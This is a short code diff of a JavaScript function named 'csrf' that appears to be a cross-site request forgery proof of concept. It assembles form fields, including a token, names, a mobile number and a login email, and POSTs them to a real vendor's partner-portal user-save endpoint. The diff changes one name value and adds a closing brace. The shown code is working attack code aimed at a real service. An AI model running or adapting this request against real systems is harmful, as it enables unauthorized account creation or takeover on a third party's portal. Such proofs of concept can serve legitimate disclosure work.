@@ -6,7 +6,7 @@ function csrf(token, key) {
 
     var params = "_Token%5Bfields%5D=" + token;
     params += "&fname=Naysser&";
-    params += "lname=tryingAi&";
+    params += "lname=trying&";
     params += "phone=&";
     params += "mobile_phone=0625638657&";
     params += "login=" + email + "&";
@@ -17,3 +17,4 @@ function csrf(token, key) {
     x1.open("POST", "https://pan.bitdefender.com/partners/my-users-save/");
     x1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     x1.send(params);
+}
